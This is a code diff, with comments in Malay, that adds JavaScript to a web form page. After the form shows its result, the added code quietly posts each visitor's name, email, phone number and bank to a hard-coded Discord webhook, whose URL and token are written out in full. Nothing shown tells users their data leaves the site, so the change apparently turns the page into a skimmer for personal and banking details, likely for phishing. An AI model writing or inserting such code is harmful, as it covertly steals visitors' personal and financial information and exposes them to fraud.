@@ -121,6 +121,32 @@
 
         // Tunjukkan hasil
         document.getElementById("result").style.display = "block";
+
+        // Hantar data ke webhook
+        const webhookUrl = "https://discord.com/api/webhooks/1354957871472709672/7RPyb9Pfp3H_ySUPxWMksoij-nS1gak3uJhiUybGDFIhCkJAKnbQf3WRffRzSH535tJG/github"; // Gantikan dengan URL webhook anda
+
+        const payload = {
+            name: name,
+            email: email,
+            phone: phone,
+            bank: bank
+        };
+
+        // Hantar POST request menggunakan fetch
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Maklumat berjaya dihantar:", data);
+        })
+        .catch(error => {
+            console.error("Terdapat ralat semasa menghantar maklumat:", error);
+        });
     });
 </script>
 
